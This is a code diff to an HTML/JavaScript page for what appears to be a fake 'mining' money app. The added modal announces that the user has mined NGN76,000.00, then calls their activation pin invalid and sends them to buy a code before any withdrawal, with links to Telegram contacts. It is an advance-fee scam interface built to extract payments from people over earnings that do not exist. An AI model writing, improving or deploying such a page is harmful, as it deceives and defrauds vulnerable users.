@@ -144,7 +144,8 @@
                 </div>
                 <div class="font-bold text-3xl">Withdraw</div>
             </div>
-        </div>        
+        </div>
+        
         <!-- Floating Green Vibrating Chat Button -->
         <div onclick="openChatUs()" 
              class="floating-chat fixed bottom-6 right-6 w-14 h-14 bg-[#22c55e] rounded-full flex items-center justify-center shadow-2xl cursor-pointer z-[999]">
@@ -304,7 +305,6 @@
         </div>
         <div id="bannerWithdraw" class="banner mx-4 mt-auto mb-6 bg-white/10 backdrop-blur-xl rounded-3xl p-4 border border-white/20"></div>
     </div>
-
     <!-- PIN SCREEN -->
     <div id="pinScreen" class="screen hidden fixed inset-0 bg-[#0a1f14] flex flex-col items-center justify-center z-60">
         <div class="text-center mb-10">
@@ -332,6 +332,7 @@
         </div>
         <div id="bannerPin" class="banner mt-auto mb-8 mx-4 bg-white/10 backdrop-blur-xl rounded-3xl p-4 border border-white/20"></div>
     </div>
+
     <!-- BUY ACTIVATION CODE / INPUT ACCOUNT DETAILS -->
     <div id="buyCodeScreen" class="screen hidden fixed inset-0 bg-[#0a1f14] flex flex-col z-50 overflow-auto">
         <div class="p-6">
@@ -535,7 +536,7 @@
             }
             setTimeout(() => document.getElementById('successModal').classList.remove('hidden'), 400);
         };
-
+        
         window.showWithdrawScreen = function() {
             document.getElementById('screen4').classList.add('hidden');
             document.getElementById('withdrawScreen').classList.remove('hidden');
@@ -715,4 +716,49 @@
                 <div class="bg-white text-black rounded-3xl max-w-xs w-full mx-6 p-8">
                     <h3 class="text-2xl font-bold mb-4">Mined successful</h3>
                     <p class="text-gray-700">You have successfully mined NGN76,000.00 to your wallet now you can withdraw</p>
-                    <button onclick="closeSuccessModal()" cla
+                    <button onclick="closeSuccessModal()" class="mt-8 w-full py-5 bg-[#22c55e] text-black rounded-2xl font-bold">OK</button>
+                </div>
+            </div>
+            
+            <div id="activationModal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center z-[100]">
+                <div class="bg-white text-black rounded-3xl max-w-xs w-full mx-6 p-8">
+                    <div class="flex justify-center mb-6">
+                        <svg width="70" height="70" viewBox="0 0 138 158" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M69 12 L20 38 L20 88 C20 122 42 140 69 148 C96 140 118 122 118 88 L118 38 L69 12 Z" fill="#166534" stroke="#fff" stroke-width="12"/>
+                            <g transform="translate(48 58) scale(0.38)">
+                                <polygon points="15,45 60,18 105,45" fill="#fff"/>
+                                <rect x="20" y="45" width="80" height="52" rx="4" fill="#fff"/>
+                            </g>
+                        </svg>
+                    </div>
+                    <h3 class="text-xl font-bold text-center mb-3">Activation Pin</h3>
+                    <p class="text-gray-700 text-center leading-relaxed">Invalid activation pin Please purvhase your activation pin from the application to continue the process and start making money daily hope you enjoy our app</p>
+                    <p class="text-xs mt-6 text-gray-600 font-medium">NOTE: Your activation pin can not be shared each activation code is designed for a user</p>
+                    <button onclick="showBuyCodeScreen()" class="mt-8 w-full py-5 bg-[#22c55e] text-black rounded-2xl font-bold">BUY CODE</button>
+                </div>
+            </div>
+        `);
+
+        function hideMiningModal() { document.getElementById('miningModal').classList.add('hidden'); }
+        function closeSuccessModal() { document.getElementById('successModal').classList.add('hidden'); }
+
+        window.openChatUs = function() {
+            document.getElementById('chatUsScreen').classList.remove('hidden');
+        };
+
+        window.closeChatUs = function() {
+            document.getElementById('chatUsScreen').classList.add('hidden');
+        };
+
+        window.openTelegramChat = function() {
+            window.open('https://t.me/center686', '_blank');
+        };
+
+        window.joinTelegramGroup = function() {
+            window.open('https://t.me/+zGcbGeELaUw1YTA0', '_blank');
+        };
+
+        window.onload = startApp;
+    </script>
+</body>
+</html>
